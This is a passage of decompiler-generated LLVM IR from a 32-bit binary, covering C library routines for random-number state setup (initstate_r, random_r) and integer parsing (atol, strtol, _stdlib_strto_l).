  %v3_804b196 = mul i32 %v9_804b18a, 2836
  store i32 %v3_804b196, i32* %eax.global-to-local, align 4
  %v2_804b19c = sub i32 %v4_804b190, %v3_804b196
  %v13_804b19c = icmp slt i32 %v2_804b19c, 0
  %v1_804b19e = icmp eq i1 %v13_804b19c, false
  %v1_804b1a0 = add i32 %v2_804b19c, 2147483647
  %v2_804b19c.v1_804b1a0 = select i1 %v1_804b19e, i32 %v2_804b19c, i32 %v1_804b1a0
  store i32 %v2_804b19c.v1_804b1a0, i32* %edx.global-to-local, align 4
  %v1_804b1a6 = add i32 %v0_804b1a6, 4
  store i32 %v1_804b1a6, i32* %ecx.global-to-local, align 4
  %v1_804b1a9 = add i32 %v0_804b1a929, 1
  store i32 %v1_804b1a9, i32* @edi, align 4
  %v2_804b1aa = inttoptr i32 %v1_804b1a6 to i32*
  store i32 %v2_804b19c.v1_804b1a0, i32* %v2_804b1aa, align 4
  %v0_804b1ac.pre = load i32, i32* @edi, align 4
  %v3_804b1ac.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t13 = trunc i64 %v3_804b1ac.pre to i32
  %v5_804b1af = icmp slt i32 %v0_804b1ac.pre, %extract.t13
  br i1 %v5_804b1af, label %dec_label_pc_804b182.dec_label_pc_804b182_crit_edge, label %dec_label_pc_804b1ac.dec_label_pc_804b1b1_crit_edge

dec_label_pc_804b182.dec_label_pc_804b182_crit_edge: ; preds = %dec_label_pc_804b182
  %v0_804b182.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_804b1a6.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b182

dec_label_pc_804b1ac.dec_label_pc_804b1b1_crit_edge: ; preds = %dec_label_pc_804b182
  %v0_804b1b1.pre = load i32, i32* @esi, align 4
  %v0_804b1b4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b1b1

dec_label_pc_804b1b1:                             ; preds = %dec_label_pc_804b1ac.dec_label_pc_804b1b1_crit_edge, %dec_label_pc_804b171
  %v0_804b1b4 = phi i32 [ %v0_804b1b4.pre, %dec_label_pc_804b1ac.dec_label_pc_804b1b1_crit_edge ], [ %v0_804b173, %dec_label_pc_804b171 ]
  %v0_804b1b1 = phi i32 [ %v0_804b1b1.pre, %dec_label_pc_804b1ac.dec_label_pc_804b1b1_crit_edge ], [ %v0_804b175, %dec_label_pc_804b171 ]
  %v1_804b1b1 = add i32 %v0_804b1b1, 20
  %v2_804b1b1 = inttoptr i32 %v1_804b1b1 to i32*
  %v3_804b1b1 = load i32, i32* %v2_804b1b1, align 4
  store i32 %v3_804b1b1, i32* %eax.global-to-local, align 4
  %v2_804b1b4 = add i32 %v0_804b1b1, 4
  %v3_804b1b4 = inttoptr i32 %v2_804b1b4 to i32*
  store i32 %v0_804b1b4, i32* %v3_804b1b4, align 4
  %v0_804b1b7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b1b7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b1b7 = mul i32 %v1_804b1b7, 4
  %v3_804b1b7 = add i32 %v2_804b1b7, %v0_804b1b7
  store i32 %v3_804b1b7, i32* %eax.global-to-local, align 4
  %v1_804b1ba = load i32, i32* @esi, align 4
  %v2_804b1ba = inttoptr i32 %v1_804b1ba to i32*
  store i32 %v3_804b1b7, i32* %v2_804b1ba, align 4
  %v3_804b1bc = load i64, i64* %stack_var_-40, align 8
  %v6_804b1bc = mul nsw i64 %v3_804b1bc, 10
  %v7_804b1bc = trunc i64 %v6_804b1bc to i32
  %v2_804b1c2 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804b1cf25 = add i32 %v7_804b1bc, -1
  %v9_804b1cf26 = icmp slt i32 %v1_804b1cf25, 0
  store i32 %v1_804b1cf25, i32* @ebx, align 4
  %v1_804b1d027 = icmp eq i1 %v9_804b1cf26, false
  br i1 %v1_804b1d027, label %dec_label_pc_804b1c2, label %dec_label_pc_804b1d2

dec_label_pc_804b1c2:                             ; preds = %dec_label_pc_804b1b1, %dec_label_pc_804b1c2
  store i32 %v2_804b1c2, i32* %eax.global-to-local, align 4
  %v0_804b1c7 = load i32, i32* @esi, align 4
  %v2_804b1c8 = inttoptr i32 %v0_804b1c7 to i32*
  %v3_804b1c8 = call i32 @__GI_random_r(i32* %v2_804b1c8, i32 %v2_804b1c2)
  store i32 %v0_804b1c7, i32* %eax.global-to-local, align 4
  store i32 %v2_804b1c2, i32* %edx.global-to-local, align 4
  %v0_804b1cf.pre = load i32, i32* @ebx, align 4
  %v1_804b1cf = add i32 %v0_804b1cf.pre, -1
  %v9_804b1cf = icmp slt i32 %v1_804b1cf, 0
  store i32 %v1_804b1cf, i32* @ebx, align 4
  %v1_804b1d0 = icmp eq i1 %v9_804b1cf, false
  br i1 %v1_804b1d0, label %dec_label_pc_804b1c2, label %dec_label_pc_804b1d2

dec_label_pc_804b1d2:                             ; preds = %dec_label_pc_804b1b1, %dec_label_pc_804b1c2, %dec_label_pc_804b16b
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b1d4

dec_label_pc_804b1d4:                             ; preds = %entry, %dec_label_pc_804b1d2
  %v0_804b1d7 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_804b1d2 ]
  store i32 %v0_804b1d7, i32* %eax.global-to-local, align 4
  store i32 %v0_804b14b, i32* @ebx, align 4
  store i32 %v0_804b14a, i32* @esi, align 4
  store i32 %v0_804b149, i32* @edi, align 4
  store i32 %v0_804b148, i32* @ebp, align 4
  ret i32 %v0_804b1d7

; uselistorder directives
  uselistorder i32 %v0_804b1d7, { 1, 0 }
  uselistorder i32 %v1_804b1cf, { 1, 0 }
  uselistorder i32 %v0_804b1b1, { 1, 0 }
  uselistorder i32 %v0_804b1ac.pre, { 1, 0 }
  uselistorder i32 %v2_804b19c.v1_804b1a0, { 1, 0 }
  uselistorder i32 %v0_804b182, { 1, 0 }
  uselistorder i32 %v0_804b173, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b1d4, { 1, 0 }
  uselistorder label %dec_label_pc_804b1d2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b1c2, { 1, 0 }
  uselistorder label %dec_label_pc_804b182, { 1, 0 }
  uselistorder label %dec_label_pc_804b16b, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_804b1e1 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_804b202, label %dec_label_pc_804b1f6

dec_label_pc_804b1f6:                             ; preds = %entry
  %v2_804b1f6 = icmp ult i32 %arg3, 256
  %v1_804b1fd = select i1 %v2_804b1f6, i32 5, i32 4
  store i32 %v1_804b1fd, i32* @ebx, align 4
  br label %dec_label_pc_804b218

dec_label_pc_804b202:                             ; preds = %entry
  %v6_804b205 = icmp ugt i32 %arg3, 31
  br i1 %v6_804b205, label %dec_label_pc_804b210, label %dec_label_pc_804b207

dec_label_pc_804b207:                             ; preds = %dec_label_pc_804b202
  store i32 0, i32* @ebx, align 4
  %v6_804b20c = icmp ugt i32 %arg3, 7
  br i1 %v6_804b20c, label %dec_label_pc_804b218, label %dec_label_pc_804b268

dec_label_pc_804b210:                             ; preds = %dec_label_pc_804b202
  %v2_804b210 = icmp ult i32 %arg3, 64
  %v1_804b215 = select i1 %v2_804b210, i32 3, i32 2
  store i32 %v1_804b215, i32* @ebx, align 4
  br label %dec_label_pc_804b218

dec_label_pc_804b218:                             ; preds = %dec_label_pc_804b207, %dec_label_pc_804b1f6, %dec_label_pc_804b210
  %v0_804b218 = phi i32 [ 0, %dec_label_pc_804b207 ], [ %v1_804b1fd, %dec_label_pc_804b1f6 ], [ %v1_804b215, %dec_label_pc_804b210 ]
  %v1_804b218 = mul nuw nsw i32 %v0_804b218, 4
  %v2_804b218 = add i32 %v1_804b218, ptrtoint (i32* @global_var_8050354.64 to i32)
  %v3_804b218 = inttoptr i32 %v2_804b218 to i32*
  %v4_804b218 = load i32, i32* %v3_804b218, align 4
  store i32 %v4_804b218, i32* %eax.global-to-local, align 4
  %v1_804b21f = add i32 %tmp7, 4
  store i32 %v1_804b21f, i32* @esi, align 4
  %v2_804b222 = add i32 %arg4, 16
  %v3_804b222 = inttoptr i32 %v2_804b222 to i32*
  store i32 %v4_804b218, i32* %v3_804b222, align 4
  %v0_804b225 = load i32, i32* @ebx, align 4
  %v1_804b225 = mul i32 %v0_804b225, 4
  %v2_804b225 = add i32 %v1_804b225, ptrtoint (i32* @global_var_8050340.65 to i32)
  %v3_804b225 = inttoptr i32 %v2_804b225 to i32*
  %v4_804b225 = load i32, i32* %v3_804b225, align 4
  store i32 %v4_804b225, i32* %edx.global-to-local, align 4
  %v0_804b22c = load i32, i32* @esi, align 4
  %v1_804b22c = load i32, i32* %eax.global-to-local, align 4
  %v2_804b22c = mul i32 %v1_804b22c, 4
  %v3_804b22c = add i32 %v2_804b22c, %v0_804b22c
  store i32 %v3_804b22c, i32* %eax.global-to-local, align 4
  %v1_804b22f = load i32, i32* @edi, align 4
  %v2_804b22f = add i32 %v1_804b22f, 12
  %v3_804b22f = inttoptr i32 %v2_804b22f to i32*
  store i32 %v0_804b225, i32* %v3_804b22f, align 4
  %v0_804b232 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b232 = load i32, i32* @edi, align 4
  %v2_804b232 = add i32 %v1_804b232, 20
  %v3_804b232 = inttoptr i32 %v2_804b232 to i32*
  store i32 %v0_804b232, i32* %v3_804b232, align 4
  %v0_804b235 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b235 = load i32, i32* @edi, align 4
  %v2_804b235 = add i32 %v1_804b235, 24
  %v3_804b235 = inttoptr i32 %v2_804b235 to i32*
  store i32 %v0_804b235, i32* %v3_804b235, align 4
  %v0_804b238 = load i32, i32* @esi, align 4
  %v1_804b238 = load i32, i32* @edi, align 4
  %v2_804b238 = add i32 %v1_804b238, 8
  %v3_804b238 = inttoptr i32 %v2_804b238 to i32*
  store i32 %v0_804b238, i32* %v3_804b238, align 4
  %v0_804b23b = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_804b240 = sext i32 %arg1 to i64
  %v3_804b240 = call i32 @srandom_r(i64 %v2_804b240, i32 %v0_804b23b)
  %v0_804b245 = load i32, i32* @ebp, align 4
  %v1_804b245 = inttoptr i32 %v0_804b245 to i32*
  store i32 0, i32* %v1_804b245, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804b250 = load i32, i32* @ebx, align 4
  %v1_804b250 = icmp eq i32 %v0_804b250, 0
  br i1 %v1_804b250, label %dec_label_pc_804b281, label %dec_label_pc_804b254

dec_label_pc_804b254:                             ; preds = %dec_label_pc_804b218
  %v0_804b254 = load i32, i32* @edi, align 4
  %v1_804b254 = add i32 %v0_804b254, 4
  %v2_804b254 = inttoptr i32 %v1_804b254 to i32*
  %v3_804b254 = load i32, i32* %v2_804b254, align 4
  %v1_804b257 = load i32, i32* @esi, align 4
  %v2_804b257 = sub i32 %v3_804b254, %v1_804b257
  %v2_804b259 = sdiv i32 %v2_804b257, 4
  %v3_804b25c = mul i32 %v2_804b259, 5
  %v2_804b25f = add i32 %v3_804b25c, %v0_804b250
  %v1_804b261 = load i32, i32* @ebp, align 4
  %v2_804b261 = inttoptr i32 %v1_804b261 to i32*
  store i32 %v2_804b25f, i32* %v2_804b261, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b281

dec_label_pc_804b268:                             ; preds = %dec_label_pc_804b207
  %v1_804b268 = call i32 @__errno_location(i32 %v0_804b1e1)
  store i32 %v1_804b268, i32* %eax.global-to-local, align 4
  %v1_804b26d = inttoptr i32 %v1_804b268 to i32*
  store i32 22, i32* %v1_804b26d, align 4
  %v0_804b273 = load i32, i32* %stack_var_-36, align 4
  %v1_804b273 = call i32 @__errno_location(i32 %v0_804b273)
  %v1_804b278 = inttoptr i32 %v1_804b273 to i32*
  store i32 22, i32* %v1_804b278, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b281

dec_label_pc_804b281:                             ; preds = %dec_label_pc_804b218, %dec_label_pc_804b254, %dec_label_pc_804b268
  %v0_804b288 = phi i32 [ 0, %dec_label_pc_804b218 ], [ 0, %dec_label_pc_804b254 ], [ -1, %dec_label_pc_804b268 ]
  ret i32 %v0_804b288

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b281, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b218, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804b297 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804b297
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804b2b1 = inttoptr i32 %arg1 to i8*
  %v5_804b2b1 = call i32 @_stdlib_strto_l(i8* %v4_804b2b1, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804b2b1
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_804b2bf = load i32, i32* @ebx, align 4
  store i32 %v0_804b2bf, i32* %stack_var_-16, align 4
  %v0_804b2c3 = load i32, i32* @global_var_8052038, align 8
  %v4_804b2c9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b2c9, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_804b2c9, i32* %ebx.global-to-local, align 4
  %v2_804b2d641 = load i8, i8* %arg1, align 1
  %v3_804b2d642 = sext i8 %v2_804b2d641 to i32
  store i32 %v3_804b2d642, i32* %eax.global-to-local, align 4
  %v2_804b2d943 = mul nsw i32 %v3_804b2d642, 2
  %v3_804b2d944 = add i32 %v2_804b2d943, %v0_804b2c3
  %v4_804b2d945 = inttoptr i32 %v3_804b2d944 to i8*
  %v5_804b2d946 = load i8, i8* %v4_804b2d945, align 1
  %v6_804b2d947 = and i8 %v5_804b2d946, 32
  %v7_804b2d948 = icmp eq i8 %v6_804b2d947, 0
  %v1_804b2dd49 = icmp eq i1 %v7_804b2d948, false
  br i1 %v1_804b2dd49, label %dec_label_pc_804b2d5, label %dec_label_pc_804b2df

dec_label_pc_804b2d5:                             ; preds = %entry, %dec_label_pc_804b2d5
  %v0_804b2d550 = phi i32 [ %v1_804b2d5, %dec_label_pc_804b2d5 ], [ %v4_804b2c9, %entry ]
  %v1_804b2d5 = add i32 %v0_804b2d550, 1
  store i32 %v1_804b2d5, i32* %ebx.global-to-local, align 4
  %v1_804b2d6 = inttoptr i32 %v1_804b2d5 to i8*
  %v2_804b2d6 = load i8, i8* %v1_804b2d6, align 1
  %v3_804b2d6 = sext i8 %v2_804b2d6 to i32
  store i32 %v3_804b2d6, i32* %eax.global-to-local, align 4
  %v2_804b2d9 = mul nsw i32 %v3_804b2d6, 2
  %v3_804b2d9 = add i32 %v2_804b2d9, %v0_804b2c3
  %v4_804b2d9 = inttoptr i32 %v3_804b2d9 to i8*
  %v5_804b2d9 = load i8, i8* %v4_804b2d9, align 1
  %v6_804b2d9 = and i8 %v5_804b2d9, 32
  %v7_804b2d9 = icmp eq i8 %v6_804b2d9, 0
  %v1_804b2dd = icmp eq i1 %v7_804b2d9, false
  br i1 %v1_804b2dd, label %dec_label_pc_804b2d5, label %dec_label_pc_804b2df

dec_label_pc_804b2df:                             ; preds = %dec_label_pc_804b2d5, %entry
  %v0_804b2d5.lcssa = phi i32 [ %v4_804b2c9, %entry ], [ %v1_804b2d5, %dec_label_pc_804b2d5 ]
  %v2_804b2d6.lcssa = phi i8 [ %v2_804b2d641, %entry ], [ %v2_804b2d6, %dec_label_pc_804b2d5 ]
  %v3_804b2d6.lcssa = phi i32 [ %v3_804b2d642, %entry ], [ %v3_804b2d6, %dec_label_pc_804b2d5 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_804b2df = icmp eq i8 %v2_804b2d6.lcssa, 43
  br i1 %v9_804b2df, label %dec_label_pc_804b2f4, label %dec_label_pc_804b2e4

dec_label_pc_804b2e4:                             ; preds = %dec_label_pc_804b2df
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_804b2e6 = icmp eq i8 %v2_804b2d6.lcssa, 45
  %v1_804b2e9 = icmp eq i1 %v9_804b2e6, false
  br i1 %v1_804b2e9, label %dec_label_pc_804b2f5, label %dec_label_pc_804b2f4

dec_label_pc_804b2f4:                             ; preds = %dec_label_pc_804b2df, %dec_label_pc_804b2e4
  %storemerge3 = phi i32 [ 1, %dec_label_pc_804b2e4 ], [ 0, %dec_label_pc_804b2df ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_804b2f4 = add i32 %v0_804b2d5.lcssa, 1
  store i32 %v1_804b2f4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b2f5

dec_label_pc_804b2f5:                             ; preds = %dec_label_pc_804b2e4, %dec_label_pc_804b2f4
  %v0_804b307 = phi i32 [ %v0_804b2d5.lcssa, %dec_label_pc_804b2e4 ], [ %v1_804b2f4, %dec_label_pc_804b2f4 ]
  %v1_804b2f7 = and i32 %arg3, -17
  %v2_804b2f7 = icmp eq i32 %v1_804b2f7, 0
  %v1_804b2fd = icmp eq i1 %v2_804b2f7, false
  br i1 %v1_804b2fd, label %dec_label_pc_804b323, label %dec_label_pc_804b2ff

dec_label_pc_804b2ff:                             ; preds = %dec_label_pc_804b2f5
  %v1_804b2ff = add i32 %arg3, 10
  store i32 %v1_804b2ff, i32* %esi.global-to-local, align 4
  %v1_804b302 = inttoptr i32 %v0_804b307 to i8*
  %v2_804b302 = load i8, i8* %v1_804b302, align 1
  %v8_804b302 = icmp eq i8 %v2_804b302, 48
  %v1_804b305 = icmp eq i1 %v8_804b302, false
  br i1 %v1_804b305, label %dec_label_pc_804b319, label %dec_label_pc_804b307

dec_label_pc_804b307:                             ; preds = %dec_label_pc_804b2ff
  %v1_804b307 = add i32 %v0_804b307, 1
  store i32 %v1_804b307, i32* %ebx.global-to-local, align 4
  %v1_804b308 = add i32 %arg3, 8
  store i32 %v1_804b308, i32* %esi.global-to-local, align 4
  %v1_804b30d = inttoptr i32 %v1_804b307 to i8*
  %v2_804b30d = load i8, i8* %v1_804b30d, align 1
  %v3_804b30d = zext i8 %v2_804b30d to i32
  %v5_804b30d = and i32 %v3_804b2d6.lcssa, -256
  %v6_804b30d = or i32 %v5_804b30d, %v3_804b30d
  %v1_804b30f = or i32 %v6_804b30d, 32
  %v3_804b30f = trunc i32 %v1_804b30f to i8
  store i32 %v1_804b30f, i32* %eax.global-to-local, align 4
  %v10_804b312 = icmp eq i8 %v3_804b30f, 120
  %v1_804b314 = icmp eq i1 %v10_804b312, false
  br i1 %v1_804b314, label %dec_label_pc_804b319, label %dec_label_pc_804b316

dec_label_pc_804b316:                             ; preds = %dec_label_pc_804b307
  %v2_804b316 = mul i32 %v1_804b308, 2
  store i32 %v2_804b316, i32* %esi.global-to-local, align 4
  %v1_804b318 = add i32 %v0_804b307, 2
  store i32 %v1_804b318, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b319

dec_label_pc_804b319:                             ; preds = %dec_label_pc_804b307, %dec_label_pc_804b2ff, %dec_label_pc_804b316
  %v0_804b34212 = phi i32 [ %v1_804b307, %dec_label_pc_804b307 ], [ %v0_804b307, %dec_label_pc_804b2ff ], [ %v1_804b318, %dec_label_pc_804b316 ]
  %v0_804b39920 = phi i32 [ %v1_804b307, %dec_label_pc_804b307 ], [ %v4_804b2c9, %dec_label_pc_804b2ff ], [ %v1_804b307, %dec_label_pc_804b316 ]
  %v0_804b319 = phi i32 [ %v1_804b308, %dec_label_pc_804b307 ], [ %v1_804b2ff, %dec_label_pc_804b2ff ], [ %v2_804b316, %dec_label_pc_804b316 ]
  %v7_804b31c = icmp sgt i32 %v0_804b319, 16
  br i1 %v7_804b31c, label %dec_label_pc_804b31e, label %dec_label_pc_804b323

dec_label_pc_804b31e:                             ; preds = %dec_label_pc_804b319
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b323

dec_label_pc_804b323:                             ; preds = %dec_label_pc_804b319, %dec_label_pc_804b2f5, %dec_label_pc_804b31e
  %v0_804b39921 = phi i32 [ %v0_804b39920, %dec_label_pc_804b319 ], [ %v4_804b2c9, %dec_label_pc_804b2f5 ], [ %v0_804b39920, %dec_label_pc_804b31e ]
  %v0_804b34213 = phi i32 [ %v0_804b34212, %dec_label_pc_804b319 ], [ %v0_804b307, %dec_label_pc_804b2f5 ], [ %v0_804b34212, %dec_label_pc_804b31e ]
  %v0_804b332 = phi i32 [ %v0_804b319, %dec_label_pc_804b319 ], [ %arg3, %dec_label_pc_804b2f5 ], [ 16, %dec_label_pc_804b31e ]
  %v1_804b323 = add i32 %v0_804b332, -2
  store i32 %v1_804b323, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_804b32b = icmp ugt i32 %v1_804b323, 34
  br i1 %v6_804b32b, label %dec_label_pc_804b38e, label %dec_label_pc_804b32d

dec_label_pc_804b32d:                             ; preds = %dec_label_pc_804b323
  %div = udiv i32 -1, %v0_804b332
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_804b332
  %v1_804b334 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_804b36e = urem i32 %arg4, 256
  br label %dec_label_pc_804b342

dec_label_pc_804b340:                             ; preds = %dec_label_pc_804b384, %dec_label_pc_804b36e
  %v4_804b342.pre = phi i32 [ %v1_804b358, %dec_label_pc_804b384 ], [ %v4_804b342.pre.pre, %dec_label_pc_804b36e ]
  %v0_804b340 = phi i32 [ %v1_804b35f, %dec_label_pc_804b384 ], [ %v0_804b340.pre, %dec_label_pc_804b36e ]
  br label %dec_label_pc_804b342

dec_label_pc_804b342:                             ; preds = %dec_label_pc_804b32d, %dec_label_pc_804b340
  %v0_804b39919 = phi i32 [ %v0_804b39921, %dec_label_pc_804b32d ], [ %v0_804b340, %dec_label_pc_804b340 ]
  %v0_804b35f = phi i32 [ %v0_804b34213, %dec_label_pc_804b32d ], [ %v0_804b340, %dec_label_pc_804b340 ]
  %v4_804b342 = phi i32 [ %div, %dec_label_pc_804b32d ], [ %v4_804b342.pre, %dec_label_pc_804b340 ]
  %v1_804b342 = inttoptr i32 %v0_804b35f to i8*
  %v2_804b342 = load i8, i8* %v1_804b342, align 1
  %v3_804b342 = zext i8 %v2_804b342 to i32
  %v5_804b342 = and i32 %v4_804b342, -256
  %v6_804b342 = or i32 %v3_804b342, %v5_804b342
  store i32 %v6_804b342, i32* %eax.global-to-local, align 4
  %v1_804b344 = add i32 %v6_804b342, -48
  store i32 %v1_804b344, i32* @ecx, align 4
  %v1_804b347 = trunc i32 %v1_804b344 to i8
  %tmp55 = icmp ult i8 %v1_804b347, 10
  br i1 %tmp55, label %dec_label_pc_804b358, label %dec_label_pc_804b34c

dec_label_pc_804b34c:                             ; preds = %dec_label_pc_804b342
  %v1_804b34c = or i32 %v6_804b342, 32
  %v3_804b34c = trunc i32 %v1_804b34c to i8
  store i32 %v1_804b34c, i32* %eax.global-to-local, align 4
  %v1_804b34f = and i32 %v1_804b344, -256
  %v2_804b34f = or i32 %v1_804b34f, 40
  store i32 %v2_804b34f, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_804b34c, 97
  br i1 %tmp56, label %dec_label_pc_804b358, label %dec_label_pc_804b355

dec_label_pc_804b355:                             ; preds = %dec_label_pc_804b34c
  %v1_804b355 = add i32 %v1_804b34c, -87
  store i32 %v1_804b355, i32* @ecx, align 4
  br label %dec_label_pc_804b358

dec_label_pc_804b358:                             ; preds = %dec_label_pc_804b34c, %dec_label_pc_804b342, %dec_label_pc_804b355
  %v0_804b387 = phi i32 [ %v2_804b34f, %dec_label_pc_804b34c ], [ %v1_804b344, %dec_label_pc_804b342 ], [ %v1_804b355, %dec_label_pc_804b355 ]
  %v1_804b358 = urem i32 %v0_804b387, 256
  store i32 %v1_804b358, i32* %eax.global-to-local, align 4
  %v1_804b35b = load i32, i32* %esi.global-to-local, align 4
  %v2_804b35b = sub i32 %v1_804b358, %v1_804b35b
  %v10_804b35b = and i32 %v2_804b35b, %v1_804b35b
  %v11_804b35b = icmp slt i32 %v10_804b35b, 0
  %v13_804b35b = icmp slt i32 %v2_804b35b, 0
  %v2_804b35d = icmp eq i1 %v13_804b35b, %v11_804b35b
  br i1 %v2_804b35d, label %dec_label_pc_804b38e, label %dec_label_pc_804b35f

dec_label_pc_804b35f:                             ; preds = %dec_label_pc_804b358
  %v1_804b35f = add i32 %v0_804b35f, 1
  store i32 %v1_804b35f, i32* %ebx.global-to-local, align 4
  %v0_804b360 = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_804b360, %div
  br i1 %tmp57, label %dec_label_pc_804b36e, label %dec_label_pc_804b366

dec_label_pc_804b366:                             ; preds = %dec_label_pc_804b35f
  %v15_804b360 = icmp eq i32 %v0_804b360, %div
  %v1_804b366 = icmp eq i1 %v15_804b360, false
  br i1 %v1_804b366, label %dec_label_pc_804b384, label %dec_label_pc_804b368

dec_label_pc_804b368:                             ; preds = %dec_label_pc_804b366
  %v1_804b368 = trunc i32 %v0_804b387 to i8
  %tmp58 = icmp ugt i8 %v1_804b368, %v1_804b334
  br i1 %tmp58, label %dec_label_pc_804b36e, label %dec_label_pc_804b384

dec_label_pc_804b36e:                             ; preds = %dec_label_pc_804b368, %dec_label_pc_804b35f
  store i32 %v4_804b36e, i32* %eax.global-to-local, align 4
  %v0_804b372 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b372 = and i32 %v0_804b372, %v4_804b36e
  store i32 %v2_804b372, i32* %ebp.global-to-local, align 4
  %v1_804b374 = call i32 @__errno_location(i32 %div)
  store i32 %v1_804b374, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_804b37c = inttoptr i32 %v1_804b374 to i32*
  store i32 34, i32* %v1_804b37c, align 4
  %v0_804b340.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804b342.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b340

dec_label_pc_804b384:                             ; preds = %dec_label_pc_804b368, %dec_label_pc_804b366
  %v4_804b384 = mul i32 %v0_804b360, %v1_804b35b
  store i32 %v1_804b358, i32* %eax.global-to-local, align 4
  %v2_804b38a = add i32 %v4_804b384, %v1_804b358
  store i32 %v2_804b38a, i32* @edx, align 4
  br label %dec_label_pc_804b340

dec_label_pc_804b38e:                             ; preds = %dec_label_pc_804b358, %dec_label_pc_804b323
  %v0_804b399 = phi i32 [ %v0_804b39921, %dec_label_pc_804b323 ], [ %v0_804b39919, %dec_label_pc_804b358 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_804b323 ], [ %div, %dec_label_pc_804b358 ]
  %v4_804b38e = icmp eq i32 %arg2, 0
  br i1 %v4_804b38e, label %dec_label_pc_804b39b, label %dec_label_pc_804b395

dec_label_pc_804b395:                             ; preds = %dec_label_pc_804b38e
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804b399 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804b399, i32* %v2_804b399, align 4
  br label %dec_label_pc_804b39b

dec_label_pc_804b39b:                             ; preds = %dec_label_pc_804b38e, %dec_label_pc_804b395
  %v0_804b39b = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804b39b, i32* %eax.global-to-local, align 4
  %v1_804b39d = trunc i32 %v0_804b39b to i8
  %v6_804b39d = icmp eq i8 %v1_804b39d, 0
  %v2_804b39f = zext i1 %v6_804b39d to i32
  %v1_804b3a14 = or i32 %v2_804b39f, -2147483648
  store i32 %v1_804b3a14, i32* %ebx.global-to-local, align 4
  %v5_804b3a7 = icmp eq i8 %tmp37, 0
  br i1 %v5_804b3a7, label %dec_label_pc_804b3bf, label %dec_label_pc_804b3ae

dec_label_pc_804b3ae:                             ; preds = %dec_label_pc_804b39b
  %v0_804b3ae = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_804b3ae, %v1_804b3a14
  br i1 %tmp59, label %dec_label_pc_804b3b2, label %dec_label_pc_804b3bf

dec_label_pc_804b3b2:                             ; preds = %dec_label_pc_804b3ae
  %v1_804b3b2 = call i32 @__errno_location(i32 %stack_var_-24.0)
